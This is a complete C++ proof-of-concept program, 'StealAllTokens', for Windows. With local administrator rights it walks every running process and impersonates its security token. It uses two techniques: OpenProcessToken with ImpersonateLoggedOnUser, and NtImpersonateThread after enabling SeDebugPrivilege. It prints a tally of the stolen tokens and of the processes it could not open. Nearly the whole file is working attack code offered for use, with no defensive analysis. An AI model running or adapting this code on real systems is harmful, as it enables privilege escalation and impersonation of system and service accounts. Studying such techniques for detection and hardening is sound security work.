
/********************************************************************
* StealAllTokens: This PoC uses two diferent technics for stealing
* the primary token from all running processes, showing that is possible
* to impersonate and use whatever token present at any process.
* 
* NOTE: We consider that source process has local Admnin privs and
* has High integrity (no SYSTEM account needed)
*********************************************************************/
#include <windows.h>
#include <iostream>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <psapi.h>

#define MAX_NAME 256

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

std::string get_username()
{
	TCHAR username[UNLEN + 1] = {0};
	DWORD username_len = UNLEN + 1;
	int res = GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}


HANDLE ListProcessThreads(DWORD dwOwnerPID)
{
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take a snapshot of all running threads  
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (!Thread32First(hThreadSnap, &te32))
	{
		printf("[-] Error Thread32First\n");  // Show cause of failure
		CloseHandle(hThreadSnap);     // Must clean up the snapshot object!
		return(NULL);
	}
	// Trying to open a thread
	do
	{
		if (te32.th32OwnerProcessID == dwOwnerPID)
		{
			HANDLE thandle = OpenThread(THREAD_DIRECT_IMPERSONATION,
							  TRUE,
						      te32.th32ThreadID
					);

			CloseHandle(hThreadSnap);

			if (thandle == NULL) {
				printf("[-] OpenThread failed\n");
				return (NULL);
			}
			else {
				printf("[+] OpenThread 0x%08X success!\n", te32.th32ThreadID);
				return (thandle);
			}
		}
	} while (Thread32Next(hThreadSnap, &te32));

	printf("[-] Process not found\n");
	return (NULL);
}

BOOL GetTokenServiceName(HANDLE hToken, LPSTR lpName, LPSTR lpDomain) {
	DWORD i, dwSize = 0, dwResult = 0;
	PTOKEN_GROUPS pGroupInfo;
	SID_NAME_USE SidType;

	// Call GetTokenInformation to get the buffer size.

	if (!GetTokenInformation(hToken, TokenGroups, NULL, dwSize, &dwSize))
	{
		dwResult = GetLastError();
		if (dwResult != ERROR_INSUFFICIENT_BUFFER) {
			printf("[-] GetTokenInformation Error %u\n", dwResult);
			return FALSE;
		}
	}

	// Allocate the buffer.

	pGroupInfo = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize);

	// Call GetTokenInformation again to get the group information.
	if (!GetTokenInformation(hToken, TokenGroups, pGroupInfo,
		dwSize, &dwSize))
	{
		printf("[-] GetTokenInformation Error %u\n", GetLastError());
		return FALSE;
	}

	// Loop through the group SIDs looking for the administrator SID.

	for (i = 0; i < pGroupInfo->GroupCount; i++)
	{

		// Lookup the account name and print it.

		dwSize = MAX_NAME;
		if (!LookupAccountSidA(NULL, pGroupInfo->Groups[i].Sid,
			lpName, &dwSize, lpDomain,
			&dwSize, &SidType))
		{
			dwResult = GetLastError();
			if (dwResult == ERROR_NONE_MAPPED)
				strcpy_s(lpName, dwSize, "NONE_MAPPED");
			else
			{
				printf("[-] LookupAccountSid Error %u\n", GetLastError());
				return FALSE;
			}
		}

		// This Token has as service group
		if (strcmp(lpDomain, "NT SERVICE") == 0)
			return true;	
	}

	if (pGroupInfo)
		GlobalFree(pGroupInfo);

	return FALSE;
}

/********************************************************************
* Technique1: Good technique for PPL processes with relaxed token DACLS
* Uses->
*	OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)
*	OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY)
*	ImpersonateLoggedOnUser()
*	
*********************************************************************/

bool Technique1(int pid) {
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	DWORD bsize = 1024;
	CHAR buffer[1024] = {0};
	HANDLE currentTokenHandle = NULL;
	char lpServiceName[MAX_NAME] = { 0 };
	char lpServiceDomain[MAX_NAME] = { 0 };
	/*
	// Add SE debug privilege
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	else {
		printf("[-] SeDebugPrivilege not enabled!\n");
		exit(1);
	}
	*/
	// Call OpenProcess() to open, print return code and error code
	SetLastError(NULL);
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);

	if (GetLastError() == NULL) {

		//Get process image name
		QueryFullProcessImageNameA((HMODULE)processHandle, 0, buffer, &bsize);

		if (GetLastError() != NULL)
		{
			printf("[-] Technique1 QueryFullProcessImageNameA Pid %i Error: %i\n", pid, GetLastError());
			SetLastError(NULL);
		}
		printf("[+] Technique1 OpenProcess() %s success!\n", buffer);
	}
	else
	{
		printf("[-] Technique1 OpenProcess() Pid %i Error: %i\n", pid, GetLastError());
		return false;
	}

	// Call OpenProcessToken(), print return code and error code
	bool getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &tokenHandle);
	if (getToken != 0)
		printf("[+] Technique1 OpenProcessToken() %s success!\n", buffer);
	else
	{
		printf("[-] Technique1 OpenProcessToken() %s Return Code: %i\n", buffer,  getToken);
		printf("[-] Technique1 OpenProcessToken() %s Error: %i\n", buffer,  GetLastError());
		CloseHandle(processHandle);
		return false;
	}

	// Impersonate user in a thread
	bool impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] Technique1 ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());

		//Case SvcHost getting Service name
		if (GetTokenServiceName(tokenHandle, lpServiceName, lpServiceDomain)) {		
			printf("Technique1|%s|%s|%s\n", buffer, (get_username()).c_str(), lpServiceName);
		}
		else {
			printf("Technique1|%s|%s|\n", buffer, (get_username()).c_str());
		}
		
	}
	else
	{
		printf("[-] Technique1 ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] Technique1 ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(processHandle);
	CloseHandle(tokenHandle);
	return true;
}

/********************************************************************
* Technique2: Good technique for those processes with a very restrictive
* open Token DACLs (Most of the Svchost processes)
* Uses->
*	OpenProcess(PROCESS_QUERY_INFORMATION)
*	ListProcessThreads()
*	NtImpersonateThread()
*
*********************************************************************/
bool Technique2(int pid) {
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	//sqos.ImpersonationLevel = SecurityIdentification;
	DWORD bsize = 1024;
	CHAR buffer[1024];
	HANDLE currentTokenHandle = NULL;
	char lpServiceName[MAX_NAME] = { 0 };
	char lpServiceDomain[MAX_NAME] = { 0 };
	HANDLE TokenHandle = NULL;;

	// Add SE debug privilege
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	else {
		printf("[-] SeDebugPrivilege not enabled!\n");
		exit(1);
	}

	// Call OpenProcess(), print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, pid);

	if (GetLastError() == NULL) {

		//Get process image name
		QueryFullProcessImageNameA((HMODULE)processHandle, 0, buffer, &bsize);

		if (GetLastError() != NULL)
		{
			printf("[-] Technique2 QueryFullProcessImageNameA Pid %i Error: %i\n", pid, GetLastError());
			return false;
		}
		printf("[+] Technique2 OpenProcess() %s success with pid %i !\n", buffer, pid);

	}
	else
	{
		printf("[-] Technique2 OpenProcess() Pid %i Error: %i\n", pid,  GetLastError());
		return false;
	}

	//Get handle from first process thread
	HANDLE hThreadToImpersonate = ListProcessThreads(pid);
	if (hThreadToImpersonate == NULL)
	{
		printf("[-] Technique2 Error getting pthread\n");
		return false;
	}


	//Calling NativeAPI NtImpersonateThread
	typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle,
		HANDLE ThreadToImpersonate,
		PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

	NtImpersonateThread* fNtImpersonateThread =
		(NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"),
			"NtImpersonateThread");

	// Impersonate user in a thread
	BOOL impersonateUser = fNtImpersonateThread(GetCurrentThread(), hThreadToImpersonate, &sqos);
	if (GetLastError() == NULL)
	{
		printf("[+] Technique2 fNtImpersonateThread() %s success!\n", buffer);
		printf("[+] Technique2 Current user is: %s\n", (get_username()).c_str());


		if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &TokenHandle)) {
			printf("[-] OpenThreadToken() Error: %i\n", GetLastError());
			printf("Technique2|%s|%s|\n", buffer, (get_username()).c_str());
		}
		else {
			//Case SvcHost getting Service name
			printf("[+] OpenThreadToken() Success!\n");
			if (GetTokenServiceName(TokenHandle, lpServiceName, lpServiceDomain)) {
				printf("Technique2|%s|%s|%s\n", buffer, (get_username()).c_str(), lpServiceName);
			}
			else {
				printf("Technique2|%s|%s|\n", buffer, (get_username()).c_str());
			}
			CloseHandle(TokenHandle);
		}
	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}

	// Closing not necessary handles
	CloseHandle(hThreadToImpersonate);
	CloseHandle(processHandle);
	return true;

}

int main(int argc, char** argv) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	int HardenedProcessesCount = 0;
	int HardenedProcesses[100] = { 0 };
	int TotalTechnique1 =  0;
	int TotalTechnique2 = 0;

	printf("[+] Current user is: %s\n", (get_username()).c_str());

	//Get pid list
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		printf("[-] Can't enumerate processes");
		exit(1);
	}

	// Calculate how many process identifiers were returned.
	cProcesses = cbNeeded / sizeof(DWORD);

	// Get process list and try to steal all tokens
	for (int i = 0; i < cProcesses; i++)
	{

		if (aProcesses[i] != 0 && aProcesses[i] !=4)
		{
			if (Technique1(aProcesses[i])) {
				RevertToSelf();
				printf("[+] Reverting thread Current user is: %s\n", (get_username()).c_str());
				TotalTechnique1++;
			}
			else {
				printf("[-] Technique 1 failed\n\n");
				printf("[+] Trying Technique 2\n");
				if (Technique2(aProcesses[i])) {					
					RevertToSelf();
					printf("[+] Reverting thread Current user is: %s\n", (get_username()).c_str());
					TotalTechnique2++;
				}
				else {
					printf("[-] Can't steal token from process pid %i\n", aProcesses[i]);
					HardenedProcesses[HardenedProcessesCount] = aProcesses[i];
					HardenedProcessesCount++;
					//exit(1);
				}
			
			};
			printf("\n");
		}
		Sleep(100);
	}

	

	//Listing processes that we couldn't open it 
	for (int j = 0; j < HardenedProcessesCount; j++) {
		printf("[+] PIDs Hardened: %i\n", HardenedProcesses[j]);
	}

	printf("\n[+] Total processes: %i\n", cProcesses);
	printf("[+] Total stolen tokens with Technique1: %i\n", TotalTechnique1);
	printf("[+] Total stolen tokens with Technique2: %i\n", TotalTechnique2);
	printf("[+] Total PIDs hardened: %i\n", HardenedProcessesCount);
	printf("[+] Total PIDs stolen: %i\n", cProcesses - HardenedProcessesCount);

	return 0;
}